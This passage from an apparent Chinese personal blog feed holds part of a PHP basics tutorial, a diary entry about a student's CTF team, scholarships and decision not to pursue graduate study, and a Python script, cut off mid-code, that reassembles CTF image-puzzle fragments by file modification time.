<span class="token keyword">global</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">Sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">Sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">Sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><h4 id="13-可变变量"><a href="#13-可变变量" class="headerlink" title="13.可变变量"></a>13.可变变量</h4><p>有时候使用可变变量名是很方便的。就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如： </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span><span class="token delimiter">?></span>  </code></pre><p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 hello 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。例如： </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>$<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'world'</span><span class="token punctuation">;</span><span class="token delimiter">?></span>  </code></pre><p>这时，两个变量都被定义了：$a 的内容是”hello”并且 $hello 的内容是”world”。因此，以下语句： </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"$a ${$a}"</span><span class="token punctuation">;</span><span class="token delimiter">?></span>  </code></pre><p>与以下语句输出完全相同的结果： </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"$a $hello"</span><span class="token punctuation">;</span><span class="token delimiter">?></span>  </code></pre><p>它们都会输出：hello world。<br>Warning<br>注意，在 PHP 的函数和类的方法中，超全局变量不能用作可变变量。$this 变量也是一个特殊变量，不能被动态引用。<br>精彩的代码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span>         <span class="token operator">=</span> <span class="token string">"We"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// $a will echo "We" .. and "We" will take $We;</span><span class="token variable">$We</span>     <span class="token operator">=</span> <span class="token string">"are"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// $$a will echo "are" .. and "are" will take $are;</span><span class="token variable">$are</span>     <span class="token operator">=</span> <span class="token string">"love"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// $$$a will echo "love" .. and "love" will take $love;</span><span class="token variable">$love</span>     <span class="token operator">=</span> <span class="token string">"php"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// $$$$a will echo "php" .. and "php" will take $php;</span><span class="token variable">$php</span>     <span class="token operator">=</span> <span class="token string">"lang"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// $$$$$a will echo "lang" .. and "lang" will not take any variables;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Returns We     [1]</span><span class="token keyword">echo</span> $<span class="token variable">$a</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Returns are     [2]</span><span class="token keyword">echo</span> $$<span class="token variable">$a</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Returns love     [3]</span><span class="token keyword">echo</span> $$$<span class="token variable">$a</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Returns php     [4]</span><span class="token keyword">echo</span> $$$$<span class="token variable">$a</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Returns lang     [5] </span></code></pre><h4 id="14-魔术常量"><a href="#14-魔术常量" class="headerlink" title="14.魔术常量"></a>14.魔术常量</h4><table><thead><tr><th>几个 PHP 的”魔术常量”名称</th><th>说明</th></tr></thead><tbody><tr><td><code>__LINE__</code></td><td>文件中的当前行号。</td></tr><tr><td><code>__FILE__</code></td><td>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP 4.0.2 起，<strong>FILE</strong> 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。</td></tr><tr><td><code>__DIR__</code></td><td>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(<strong>FILE</strong>)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0中新增） =</td></tr><tr><td><code>__FUNCTION__</code></td><td>函数名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。</td></tr><tr><td><code>__CLASS__</code></td><td>类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。类名包括其被声明的作用区域（例如 Foo\Bar）。注意自 PHP 5.4 起 <strong>CLASS</strong> 对 trait 也起作用。当用在 trait 方法中时，<strong>CLASS</strong> 是调用 trait 方法的类的名字。</td></tr><tr><td><code>__TRAIT__</code></td><td>Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4 起此常量返回 trait 被定义时的名字（区分大小写）。Trait 名包括其被声明的作用区域（例如 Foo\Bar）。</td></tr><tr><td><code>__METHOD__</code></td><td>类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。</td></tr><tr><td><code>__NAMESPACE__</code></td><td>当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）。</td></tr><tr><td>#### 15.错误控制运算符</td><td></td></tr><tr><td>PHP 支持一个错误控制运算符：@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</td><td></td></tr></tbody></table><h4 id="16-执行运算符"><a href="#16-执行运算符" class="headerlink" title="16.执行运算符"></a>16.执行运算符</h4><p>PHP 支持一个执行运算符：反引号<code>（``）</code>。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符”<code>&quot;的效果与函数 shell_exec() 相同。</code><br><?php$output = `ls -al`;echo "<pre>$output</pre>";?><br>`<br>反引号运算符在激活了安全模式或者关闭了 shell_exec() 时是无效的。 </p><h4 id="17-字符串运算符"><a href="#17-字符串运算符" class="headerlink" title="17.字符串运算符"></a>17.字符串运算符</h4><p>有两个字符串（string）运算符。第一个是连接运算符（”.”），它返回其左右参数连接后的字符串。第二个是连接赋值运算符（”.=”），它将右边参数附加到左边的参数之后。更多信息见赋值运算符。 </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"Hello "</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span> <span class="token punctuation">.</span> <span class="token string">"World!"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// now $b contains "Hello World!"</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"Hello "</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"World!"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// now $a contains "Hello World!"</span><span class="token delimiter">?></span> <span class="token keyword">If</span> you attempt to add numbers with a concatenation operator<span class="token punctuation">,</span> your result will be the result of those numbers <span class="token keyword">as</span> strings<span class="token punctuation">.</span><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"thr"</span><span class="token punctuation">.</span><span class="token string">"ee"</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//prints the string "three"</span><span class="token keyword">echo</span> <span class="token string">"twe"</span> <span class="token punctuation">.</span> <span class="token string">"lve"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//prints the string "twelve"</span><span class="token keyword">echo</span> <span class="token number">1</span> <span class="token punctuation">.</span> <span class="token number">2</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//prints the string "12"</span><span class="token keyword">echo</span> <span class="token number">1.2</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//prints the number 1.2</span><span class="token keyword">echo</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//prints the number 3</span><span class="token delimiter">?></span> </code></pre><h4 id="18-类型运算符"><a href="#18-类型运算符" class="headerlink" title="18.类型运算符"></a>18.类型运算符</h4><p>instanceof 用于确定一个 PHP 变量是否属于某一类 class 的实例： </p><p>Example #1 对类使用 instanceof</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">NotMyClass</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">instanceof</span> <span class="token class-name">MyClass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">instanceof</span> <span class="token class-name">NotMyClass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>  </code></pre><p>以上例程会输出：</p><pre><code>bool(true)bool(false)</code></pre><p>instanceof　也可用来确定一个变量是不是继承自某一父类的子类的实例</p><h4 id="19-foreach"><a href="#19-foreach" class="headerlink" title="19.foreach"></a>19.foreach</h4><p>foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法： </p><pre class=" language-php"><code class="language-php"><span class="token keyword">foreach</span> <span class="token punctuation">(</span>array_expression <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    statement<span class="token keyword">foreach</span> <span class="token punctuation">(</span>array_expression <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span>    statement</code></pre><h4 id="20-可变函数"><a href="#20-可变函数" class="headerlink" title="20.可变函数"></a>20.可变函数</h4><p>可变函数 </p><p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。 </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 使用 echo 的包装函数</span><span class="token keyword">function</span> <span class="token function">echoit</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">'echoit'</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// This calls echoit()</span><span class="token delimiter">?></span> </code></pre><h4 id="21-匿名函数"><a href="#21-匿名函数" class="headerlink" title="21. 匿名函数"></a>21. 匿名函数</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$greet</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello %s\r\n"</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$greet</span><span class="token punctuation">(</span><span class="token string">'World'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$greet</span><span class="token punctuation">(</span><span class="token string">'PHP'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原谅我再一次年少轻狂</title>
      <link href="/2019/09/30/yuan-liang-wo-zai-yi-ci-nian-shao-qing-kuang/"/>
      <url>/2019/09/30/yuan-liang-wo-zai-yi-ci-nian-shao-qing-kuang/</url>
      
        <content type="html"><![CDATA[<h4 id="现在刚好是凌晨三点，花了一晚上把战队实验室彻彻底底收拾了一遍，一来算作欢迎新生吧，另外也希望自己有个新气象，没想到大三开学才一个月，陆陆续续经历了这么多事，收拾完实验室终于坐在了电脑前，大脑却如此空白，也如此清晰"><a href="#现在刚好是凌晨三点，花了一晚上把战队实验室彻彻底底收拾了一遍，一来算作欢迎新生吧，另外也希望自己有个新气象，没想到大三开学才一个月，陆陆续续经历了这么多事，收拾完实验室终于坐在了电脑前，大脑却如此空白，也如此清晰" class="headerlink" title="现在刚好是凌晨三点，花了一晚上把战队实验室彻彻底底收拾了一遍，一来算作欢迎新生吧，另外也希望自己有个新气象，没想到大三开学才一个月，陆陆续续经历了这么多事，收拾完实验室终于坐在了电脑前，大脑却如此空白，也如此清晰"></a>现在刚好是凌晨三点，花了一晚上把战队实验室彻彻底底收拾了一遍，一来算作欢迎新生吧，另外也希望自己有个新气象，没想到大三开学才一个月，陆陆续续经历了这么多事，收拾完实验室终于坐在了电脑前，大脑却如此空白，也如此清晰</h4><p>数一数最近让我掀起涟漪的事<br>0. 新的学期，战队开始宣讲培训</p><ol><li>评优评奖混到了三等奖学金</li><li>公开答辩了校长特别嘉奖奖学金</li><li>大四的学长学姐们保研的保研，转正的转正</li><li>刘哲老师获得青橙奖后欢迎我读他研究生</li><li>在公司的师傅问我愿不愿意每周全职工作两三天</li><li>阅读了犯罪心理学</li></ol><p>为什么取这个标题呢~其实核心问题就是纠结了自己未来读研还是不读研的问题？</p><a id="more"></a><p>emmm 既然现在大脑不如缕一缕这几个事</p><h4 id="0x0-Asuri战队和CTF"><a href="#0x0-Asuri战队和CTF" class="headerlink" title="0x0:Asuri战队和CTF"></a>0x0:Asuri战队和CTF</h4><p>想想当初为什么要打ctf呢，最开始确实只是出于确实在大学我算法不会，刚开始开发无力，也只能ctf来当一个学习技术的切入点。后来因为友情吧，毕竟人是感性动物，一起上过战场的怎么能说溜就溜，确实asuri和ctf待我不薄，也获得一些奖项和能力，让我有了是不是选择专长潜质保研的前提。<br>这个学期开始呢，陆师傅也大四了，回头想想我和曹师傅都大三了，战队里的老人也就我们两了，所以开始接下了宣讲培训等一系列的事。为什么花这么多时间准备筹备宣讲培训嘞，我觉得很简单，几乎所有人都想在离开学校前，为自己的组织做些什么吧。<br>好在大一的小朋友们都很优秀，连夜作题冲榜，宣讲后招新群每天也有人加入，而不是我们预期了宣讲后劝退走一半，这里非常感谢耗子果果~令人敬佩的队长。<br>（给一张在113台上的照片吧 如果没记错这好像也是第一在113台上 讲台真高=ε=ε=┏(゜ロ゜;)┛</p><img width=250 src="3.jpg" ><h4 id="0x1-amp-0x2-奖学金的事"><a href="#0x1-amp-0x2-奖学金的事" class="headerlink" title="0x1&amp;0x2:奖学金的事"></a>0x1&amp;0x2:奖学金的事</h4><p>讲真，我不在意钱，确实我家没钱，甚至算很穷的那种，但是我觉得能吃饱学计算机就行了，自己也一直没在意钱，至于奖学金的荣誉，hhh对我来说确实没有丝毫想法，上一学年吧，pa很惨，算法，计组，数据结构，概率论课课程都申请了免听，但是在玖神的帮助下，每次考前都看了看老点，考的都还行，（确实过两天就忘了233，其他时间都在打打比赛，做做项目中度过，确实我如果是我父亲，我可能已经来到学校指着我的头说：你在玩火<br>直到前两天看了看犯罪心理学，我们暂且把玩火当一种小犯罪吧，里面有句话突然触碰到我的大脑最敏感的那个神经元<br><code>“任何犯罪都与生活环境有关”</code><br>确实想想自己入初中以来，当墙头草在左右摇摆时，裁决权都在我。高中父母不懂成绩，只知道在学校学好就行，考上南航的时候母亲还不知是一本还是二本，就现在母亲也不知道自己大学名字的全称，当然我妈南京都没来过也不能怪她。比较难受的是我父亲现在都不知道我在上大学，嗨每次想想都很悲很悲<del>不过也明白了，人要为自己而活<br>所以到了大学以来更是自己管自己，大二一年也多多少少接了几个开发的锅，也拿到了五位数的工资，再加上贷款资助金奖学金勉强维持了生活（啊？你确定没跑题，怎么说这么远了/(ㄒoㄒ)/</del>）<br>导员在答辩的前一天下午和我说准备一下校长特别嘉奖答辩~晕,做了半晚ppt,参加了答辩,(再一次站在了113台上 讲台真的有些高ε=ε=ε=┏(゜ロ゜;)┛</p><img width=450 src="4.jpg" >但是感觉这一切都是被安排的，答辩结果了过了学院的推荐，等待上一级的宰割<h4 id="0x3-amp-0x4-研究生？不可能的"><a href="#0x3-amp-0x4-研究生？不可能的" class="headerlink" title="0x3&amp;0x4:研究生？不可能的"></a>0x3&amp;0x4:研究生？不可能的</h4><p>最近心理碰触比较大的也有周围的学长有本校的，有北大的，有北航的，昨天路上遇到一个学姐聊了两句她去了中科大！！！<br>首先呢，保外校基本是不可能的，所以我一直没想过保送研究生的事，直到前两天刘哲老师拿到了今年青橙奖，学校各大公众号订阅号开始疯狂吹爆刘哲教授，但是第二天下午他居然微信来找我问我愿不愿意读研，提出的两个条件是大四能送我去清华交换，第二个是送往达摩院实习。我绩点保送外校肯定是不可能的，但是我保持一下专长保送研究生本校应该不需要太努力</p><p>确实让我纠结了几天，也没法和家里人聊聊，所以和曹师傅，朋友，学长都问了问。大部分支持读研的。<br>经过一番斗争，最后决定自己未来肯定不读研了，理由有三</p><ol><li>家中确实很急钱，虽然很多人说读研出来工资高~，但是我愿意把这三年去社会上升值，而不是靠水论文让自己身价提高</li><li>自己确实已经不适合在学校生活，不仅是太想赚钱了，还有就是想去社会上看看</li><li>于我个人而言，对研究生的平均生活很失望，因为一些工作接触了一些研究生学长也每天看着他们每天做什么，我确实很明确了，那不是我想要的生活。</li></ol><h4 id="0x5-大三去不去兼职呢"><a href="#0x5-大三去不去兼职呢" class="headerlink" title="0x5:大三去不去兼职呢"></a>0x5:大三去不去兼职呢</h4><p>在前面一条确定之前，这个问题肯定是很纠结的，如果去，意味着每周三天在公司，那么一定有一些课需要翘课，因为我自己是软件工程专业的，自己学习的方向又是网络安全，所以也没啥脸去申请免听，天意吧，而且一旦翘课基本上绩点得不到保障。所以当时的选择是翘课去公司上班还是刷题看书保研<br>小孩子才选，我都不去<br>保研是不可能保研的~ 上一条说明了一切<br>去公司也没啥必要了，在小厂实习的资历应该已经够了，前前后后也做了一些项目，这个公司也是小厂去了似乎没什么意义</p><h4 id="说了一大堆，说了些啥玩意"><a href="#说了一大堆，说了些啥玩意" class="headerlink" title="说了一大堆，说了些啥玩意"></a>说了一大堆，说了些啥玩意</h4><p>总结就是不打算争取保送研究生了<br>当然大三也不会再去小厂做一些低级的外包了，有时间倒是想认真带一带战队，顺便出去看看祖国的大好河山<br>其他时间玩玩漂移板，吹吹笛子，准备准备明年春招，或许我的大学生涯就是这样，我的人生就长这样了</p><h4 id="希望未来的我能够原谅自己的这一次年少轻狂"><a href="#希望未来的我能够原谅自己的这一次年少轻狂" class="headerlink" title="希望未来的我能够原谅自己的这一次年少轻狂"></a>希望未来的我能够原谅自己的这一次年少轻狂</h4>]]></content>
      
      
      <categories>
          
          <category> 起居注 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python拼图</title>
      <link href="/2019/09/21/python-pin-tu/"/>
      <url>/2019/09/21/python-pin-tu/</url>
      
        <content type="html"><![CDATA[<h3 id="之前一直会碰到拼二维码什么的，总是浪费很多时间最近看到一个大师傅的一个想法，通过图片的修改时间来拼图Orz"><a href="#之前一直会碰到拼二维码什么的，总是浪费很多时间最近看到一个大师傅的一个想法，通过图片的修改时间来拼图Orz" class="headerlink" title="之前一直会碰到拼二维码什么的，总是浪费很多时间最近看到一个大师傅的一个想法，通过图片的修改时间来拼图Orz"></a>之前一直会碰到拼二维码什么的，总是浪费很多时间最近看到一个大师傅的一个想法，通过图片的修改时间来拼图Orz</h3><p>主要是os模块对文件的操作</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> timefile<span class="token operator">=</span><span class="token string">'1.mp4'</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getatime<span class="token punctuation">(</span>file<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出最近访问时间1318921018.0</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getctime<span class="token punctuation">(</span>file<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出文件创建时间</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getmtime<span class="token punctuation">(</span>file<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出最近修改时间</span>time<span class="token punctuation">.</span>gmtime<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getmtime<span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#以struct_time形式输出最近修改时间</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span>file<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出文件大小（字节为单位）</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>file<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出绝对路径'/Volumes/Leopard/Users/Caroline/Desktop/1.mp4'</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>normpath<span class="token punctuation">(</span>file<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出'/Volumes/Leopard/Users/Caroline/Desktop/1.mp4'</span></code></pre><a id="more"></a><p>比如说这样一大堆的拼图<br><img src="1.png" alt=""><br>手动拼肯定人都要没了，基于时间考虑就是默认认为图片碎片生成的时间是有规律的，从上往下，由左至右<br>我们利用<code>os.path.getmtime(file)   #输出最近修改时间</code>即可快速完成</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">import</span> os<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagepath <span class="token operator">=</span> <span class="token string">"./all/"</span><span class="token keyword">def</span> <span class="token function">get_file_list</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    dir_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> dir_list<span class="token punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        dir_list <span class="token operator">=</span> sorted<span class="token punctuation">(</span>dir_list<span class="token punctuation">,</span>  key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getmtime<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>dir_list<span class="token punctuation">)</span>        <span class="token keyword">return</span> dir_listlist_im <span class="token operator">=</span> get_file_list<span class="token punctuation">(</span>path<span class="token punctuation">)</span>column <span class="token operator">=</span> <span class="token number">6</span>row_num <span class="token operator">=</span> <span class="token number">6</span>width <span class="token operator">=</span> <span class="token number">51</span>height <span class="token operator">=</span> <span class="token number">51</span>imgs <span class="token operator">=</span> <span class="token punctuation">[</span>Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>path<span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> list_im<span class="token punctuation">]</span>target <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token operator">*</span>column<span class="token punctuation">,</span> height<span class="token operator">*</span>row_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>list_im<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> column <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        end <span class="token operator">=</span> len<span class="token punctuation">(</span>list_im<span class="token punctuation">)</span> <span class="token keyword">if</span> i <span class="token operator">+</span> column <span class="token operator">></span> len<span class="token punctuation">(</span>list_im<span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token operator">+</span> column         <span class="token keyword">for</span> col<span class="token punctuation">,</span> image <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>imgs<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>column<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            target<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>image<span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token operator">*</span>col<span class="token punctuation">,</span> height<span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">//</span>column<span class="token punctuation">)</span><span class="token punctuation">,</span>                                  width<span class="token operator">*</span><span class="token punctuation">(</span>col <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> height<span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">//</span>column <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   target<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="2.png" alt=""><br>Orz</p><h3 id="2019121"><a href="#2019121" class="headerlink" title="2019121"></a>2019121</h3><p>又出现了，这回要自己改一下长度和后缀，容易改乱了</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagepath <span class="token operator">=</span> <span class="token string">"./result/"</span><span class="token keyword">def</span> <span class="token function">get_file_list</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    dir_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> dir_list<span class="token punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        dir_list <span class="token operator">=</span> sorted<span class="token punctuation">(</span>dir_list<span class="token punctuation">,</span>  key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getmtime<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>dir_list<span class="token punctuation">)</span>        <span class="token keyword">return</span> dir_listlist_im <span class="token operator">=</span> get_file_list<span class="token punctuation">(</span>path<span class="token punctuation">)</span>column <span class="token operator">=</span> <span class="token number">6</span>row_num <span class="token operator">=</span> <span class="token number">6</span>width <span class="token operator">=</span> <span class="token number">134</span>height <span class="token operator">=</span> <span class="token number">134</span><span class="token keyword">for</span> i <span class="token keyword">in</span> list_im<span class="token punctuation">:</span>    os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>path<span class="token operator">+</span>i<span class="token punctuation">,</span>path<span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'.png'</span><span class="token punctuation">)</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>path<span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'.png'</span><span class="token punctuation">)</span>    out <span class="token operator">=</span> img<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">,</span>Image<span class="token 